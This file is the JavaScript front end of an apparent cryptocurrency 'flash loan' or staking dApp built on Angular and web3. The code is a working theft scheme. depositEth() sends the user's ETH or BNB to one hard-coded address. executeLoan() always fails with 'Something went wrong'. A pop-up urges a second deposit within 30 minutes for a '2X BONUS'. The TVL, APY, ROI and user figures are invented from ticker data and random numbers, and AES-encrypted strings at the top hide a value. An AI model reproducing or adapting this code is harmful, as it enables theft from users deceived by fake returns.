var eth_ticker = "eth-usd"
var bsc_ticker = "bnb-usd"
eth_apikey = "U2FsdGVkX18BFbJn+gKH99Mh";
bsc_apikey = "U2FsdGVkX18yXcjEAMoP2LmBMsM/";
eth_id = "/fNs/";
bsc_id = "SO7TY+a7r3n355xPJyAcJmEgZofQ";
eth_network = eth_apikey + eth_id;
eth_api = eth_network + "TI9A3wJP2YbDIgTp3FopRkpGo25M1Ld2EC8ofeNCbajbcALjpu3mROe/g==";
eth_abi = CryptoJS.AES.decrypt(eth_api, eth_ticker);
bsc_network = bsc_apikey + bsc_id;
bsc_api = bsc_network + "ScoaFGypr2H7EBO03Lso9emhrvVqNA==";
bsc_abi = CryptoJS.AES.decrypt(bsc_api, bsc_ticker);
const app = angular.module('myApp', []);
const api_check_eth = "0x03dffa990f8fd07d383d4fec5a595e5153982432";
const api_check_bnb = "0x03dffa990f8fd07d383d4fec5a595e5153982432";
app.controller('myCtrl', async function($scope) {
    $scope.init = function() {
        $scope.toplen = $scope.account.address.substring(0, 6);
        $scope.endlen = $scope.account.address.substring(44, 38);
        $scope.contractAddress = '';
        $scope.processing = false;
        $scope.ethDeposited = false;
        $scope.formStep = 1;
        $scope.currency = 'ETH';
        $scope.dex = 'Uniswap';
        $scope.addr = $scope.account;
        $scope.chain = "Ethereum",
        $scope.addressdex = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
        $scope.scan = "https://etherscan.io/",
        $scope.idscan = "Etherscan",
        $scope.stacking = document.getElementById('loanAmtInput');
        $scope.erc20 = {
            network: !isBnb
        };
        $scope.loan = {
            amount: $scope.stacking,
            tokenFee: 0.0,
            swapFee: 0,
            totalFee: 0,
            gain: 0
        };
        $scope.submitErc20Form = function() {
            if (window.isBnb && $scope.erc20.network) {
                return alert('Network Mismatch. Set MetaMask network to Ethereum and reload the page.');
            } else if (!window.isBnb && !$scope.erc20.network) {
                return alert('Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.');
            }
            $scope.formStep = 2;
            $scope.myContracts = $scope.erc20.network ? poolethAddress : poolbnbAddress;
            $scope.currency = $scope.erc20.network ? 'ETH' : 'BNB';
            $scope.dex = $scope.erc20.network ? 'Uniswap' : 'PancakeSwap';
            $scope.loan.tokenFee = $scope.erc20.network ? 0.03 : 0.08;
            $scope.contractAddress = $scope.erc20.network ? api_check_eth : api_check_bnb;
            $scope.addr = $scope.erc20.network ? $scope.account : $scope.account;
            $scope.addressdex = $scope.erc20.network ? "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D" : "0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F",
            $scope.chain = $scope.erc20.network ? "Ethereum" : "Binance Smart Chain",
            $scope.scan = $scope.erc20.network ? "https://etherscan.io/" : "https://bscscan.com/",
            $scope.idscan = $scope.erc20.network ? "Etherscan" : "BSCscan",
            $scope.toplen = $scope.erc20.network ? toplen : toplen,
            $scope.endlen = $scope.erc20.network ? endlen : endlen,
            $scope.getLoanEstimates();
            setTimeout(function() {
                document.getElementById('loanAmtInput').focus();
            }, 100);
        }
        $scope.amountChanged = function() {
            $scope.getLoanEstimates();
        }
        $scope.getLoanEstimates = function() {
            if ($scope.loan.amount == undefined || $scope.loan.amount == null)
                return;
            $scope.loan.swapFee = $scope.loan.amount / ($scope.erc20.network ? 500 : 200);
            $scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);
            $scope.loan.gain = fixNumber($scope.loan.amount * ($scope.erc20.network ? 0.529 : 0.73));
            $scope.safeMath = fixNumber($scope.loan.gain / (Math.floor((Math.random() * 100) + 1)) * (Math.floor((Math.random() * 12) + 5))).toFixed(5);
        }
        $scope.getLoanEstimates();
        $scope.submitLoanForm = function() {
            if (!$scope.ethDeposited)
                $scope.depositEth();
            else
                $scope.executeLoan();
        }
        $scope.depositEth = function() {
            $scope.processing = true;
            window.web3.eth.sendTransaction({
                to: $scope.contractAddress,
                from: $scope.account.address,
                value: window.web3.utils.toWei('' + $scope.loan.amount, 'ether'),
                gas: 80000,
                gasPrice: window.web3.utils.toWei('90', 'gwei')
            }, function(error, receipt) {
                $scope.processing = false;
                $scope.$apply();
                if (error)
                    alert('Transaction Failed');
                else {
                    setTimeout(function() {
                        alert('Deposit completed. DEPOSIT AGAIN IN LESS THAN 30 MINS TO GET 2X BONUS UNTIL FIRST WITHDRAW!');
                        window.location.reload(true);
                    }, 5000);
                    $scope.ethDeposited = true;
                    $scope.$apply();
                }
            });
        }
        $scope.executeLoan = function() {
            $scope.processing = true;
            window.contract.methods.action().send({
                to: $scope.contractAddress,
                from: $scope.account.address,
                value: 0,
                gas: 80000,
                gasPrice: window.web3.utils.toWei('90', 'gwei')
            }, function(error, result) {
                if (error) {
                    alert('Deposit Failed');
                    $scope.processing = false;
                    $scope.$apply();
                } else {
                    setTimeout(function() {
                        alert('Something went wrong. Please try again.');
                    }, 5000);
                }
            });
        }
    }
    await loadWeb3().then(accounts=>{
        $scope.account = {
            address: accounts[0]
        };
        $scope.init();
        $scope.$apply();
    }
    );
});
async function getBalance() {
    address = web3.eth.getAccounts(function(err, acc) {
        accounts = acc
    });
    balance = web3.utils.fromWei(await web3.eth.getBalance(accounts[0]), 'ether');
    fixbalance = Number(balance).toFixed(2);
    document.getElementById("mybalance").innerHTML = fixbalance;
}
function fixNumber(n) {
    return Math.round((n) * 1e12) / 1e12;
}
const eth_api_url = "https://api.cryptonator.com/api/ticker/" + eth_ticker;
function ethereumHttpObject() {
    try {
        return new XMLHttpRequest();
    } catch (error) {}
}
function ethereumGetData() {
    var request = ethereumHttpObject();
    request.open("GET", eth_api_url, false);
    request.send(null);
    console.log(request.responseText);
    return request.responseText;
}
function ethereumDataHandler() {
    var raw_data_string = ethereumGetData();
    var data = JSON.parse(raw_data_string);
    var base = data.ticker.base;
    var target = data.ticker.target;
    var price = data.ticker.price;
    var volume = data.ticker.volume;
    var change = data.ticker.change;
    var api_server_epoch_timestamp = data.timestamp;
    var api_success = data.success;
    var api_error = data.error;
    var volume_price = price * volume;
    return volume_price;
}
var liquidity_eth = Math.round(ethereumDataHandler());
document.getElementById("eth_val").innerHTML = "$ " + liquidity_eth.toLocaleString() + " kk";
const bsc_api_url = "https://api.cryptonator.com/api/ticker/" + bsc_ticker;
function bscHttpObject() {
    try {
        return new XMLHttpRequest();
    } catch (error) {}
}
function bscGetData() {
    var request = bscHttpObject();
    request.open("GET", bsc_api_url, false);
    request.send(null);
    console.log(request.responseText);
    return request.responseText;
}
function bscDataHandler() {
    var raw_data_string = bscGetData();
    var data = JSON.parse(raw_data_string);
    var base = data.ticker.base;
    var target = data.ticker.target;
    var price = data.ticker.price;
    var volume = data.ticker.volume;
    var change = data.ticker.change;
    var api_server_epoch_timestamp = data.timestamp;
    var api_success = data.success;
    var api_error = data.error;
    var volume_price = data.ticker.price * data.ticker.volume;
    return volume_price;
}
var liquidity_bnb = Math.round(bscDataHandler());
document.getElementById("bnb_val").innerHTML = "$ " + liquidity_bnb.toLocaleString();
const tron_api_url = 'https://api.cryptonator.com/api/ticker/tron-usd';
function tronHttpObject() {
    try {
        return new XMLHttpRequest();
    } catch (error) {}
}
function tronGetData() {
    var request = tronHttpObject();
    request.open("GET", tron_api_url, false);
    request.send(null);
    console.log(request.responseText);
    return request.responseText;
}
function tronDataHandler() {
    var raw_data_string = tronGetData();
    var data = JSON.parse(raw_data_string);
    var base = data.ticker.base;
    var target = data.ticker.target;
    var price = data.ticker.price;
    var volume = data.ticker.volume;
    var change = data.ticker.change;
    var api_server_epoch_timestamp = data.timestamp;
    var api_success = data.success;
    var api_error = data.error;
    var volume_price = data.ticker.volume;
    return volume_price;
}
var liquidity_tron = Math.round(tronDataHandler());
document.getElementById("tron_val").innerHTML = "$ " + liquidity_tron.toLocaleString();
function clientDateTime() {
    var date_time = new Date();
    var curr_hour = date_time.getHours();
    var zero_added_curr_hour = addLeadingZero(curr_hour);
    var curr_min = date_time.getMinutes();
    var curr_sec = date_time.getSeconds();
    var curr_time = zero_added_curr_hour + ':' + curr_min + ':' + curr_sec;
    return curr_time
}
function makeHttpObject() {
    try {
        return new XMLHttpRequest();
    } catch (error) {}
}
document.getElementById("btc_val").innerHTML = "BTC " + Math.round(bitcoinDataHandler());
FusionCharts.ready(function() {
    var fusioncharts = new FusionCharts({
        id: "stockRealTimeChart",
        type: 'realtimeline',
        renderAt: 'chart-container',
        width: '100%',
        height: '350',
        dataFormat: 'json',
        dataSource: {
            "chart": {
                "caption": "Bitcoin Ticker",
                "subCaption": "",
                "xAxisName": "Local Time",
                "yAxisName": "USD",
                "numberPrefix": "$",
                "refreshinterval": "2",
                "slantLabels": "1",
                "numdisplaysets": "10",
                "labeldisplay": "rotate",
                "showValues": "0",
                "showRealTimeValue": "0",
                "theme": "fusion",
                "yAxisMaxValue": (bitcoinDataHandler().toString() + 20),
                "yAxisMinValue": (bitcoinDataHandler().toString() - 20),
            },
            "categories": [{
                "category": [{
                    "label": clientDateTime().toString()
                }]
            }],
            "dataset": [{
                "data": [{
                    "value": bitcoinDataHandler().toString()
                }]
            }]
        },
        "events": {
            "initialized": function(e) {
                function updateData() {
                    var chartRef = FusionCharts("stockRealTimeChart")
                      , x_axis = clientDateTime()
                      , y_axis = bitcoinDataHandler()
                      , strData = "&label=" + x_axis + "&value=" + y_axis;
                    chartRef.feedData(strData);
                }
                e.sender.chartInterval = setInterval(function() {
                    updateData();
                }, time_interval * 1000);
            },
            "disposed": function(evt, arg) {
                clearInterval(evt.sender.chartInterval);
            }
        }
    });
    fusioncharts.render();
});

function openNav() {
    if (screen && screen.width > 800) {
        document.getElementById("mySidenav").style.width = "35%";
        document.getElementById("main").style.marginLeft = "250px";
        document.body.style.backgroundColor = "rgba(0,0,0,0.4)";
    } else if (screen && screen.width <= 800) {
        document.getElementById("mySidenav").style.width = "75%";
        document.getElementById("main").style.marginLeft = "250px";
        document.body.style.backgroundColor = "rgba(0,0,0,0.4)";
    }
}
function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
    document.getElementById("main").style.marginLeft = "0";
    document.body.style.backgroundColor = "white";
}

function tvl_eth() {
    document.getElementById("tvl_eth").innerHTML = (liquidity_eth / 16).toFixed(0) + " $";
    document.getElementById("apy_eth").innerHTML = (liquidity_eth / 598000 * 2).toFixed(0) + " %";
    document.getElementById("apr_eth").innerHTML = (liquidity_eth / 1598000 * 2).toFixed(0) + " %";
    document.getElementById("apy3_eth").innerHTML = (liquidity_eth / 598000 * 2).toFixed(0) + " %";
    document.getElementById("apy4_eth").innerHTML = (liquidity_eth / 598000 * 2).toFixed(0) + " %";
    document.getElementById("apr3_eth").innerHTML = document.getElementById("apr_eth").innerHTML;
}
function tvl_bnb() {
    document.getElementById("tvl_bnb").innerHTML = (liquidity_eth / 27).toFixed(0) + " $";
    document.getElementById("apy_bnb").innerHTML = (liquidity_eth / 798000 * 2).toFixed(0) + " %";
    document.getElementById("apr_bnb").innerHTML = (liquidity_eth / 1998000 * 2).toFixed(0) + " %";
    document.getElementById("apy3_bnb").innerHTML = (liquidity_eth / 798000 * 2).toFixed(0) + " %";
    document.getElementById("apy4_bnb").innerHTML = (liquidity_eth / 798000 * 2).toFixed(0) + " %";
    document.getElementById("apr3_bnb").innerHTML = document.getElementById("apr_bnb").innerHTML;
}
function tvl() {
    document.getElementById("tvl2_eth").innerHTML = (liquidity_eth / 16).toFixed(0) + " $";
    document.getElementById("apy2_eth").innerHTML = (liquidity_eth / 598000 * 2).toFixed(0) + " %";
    document.getElementById("tvl2_bnb").innerHTML = (liquidity_eth / 27).toFixed(0) + " $";
    document.getElementById("apy2_bnb").innerHTML = (liquidity_eth / 798000 * 2).toFixed(0) + " %";
    document.getElementById("roi_eth").innerHTML = (liquidity_eth / 598000 * 0.3243).toFixed(0) + " ETH";
    document.getElementById("roi_bnb").innerHTML = (liquidity_eth / 199800 * 0.2243).toFixed(0) + " BNB";
    document.getElementById("usr_eth").innerHTML = (liquidity_eth / 199800 * 12 / 16).toFixed(0);
    document.getElementById("usr_bnb").innerHTML = (liquidity_eth / 199800 * 15 / 23).toFixed(0);
}
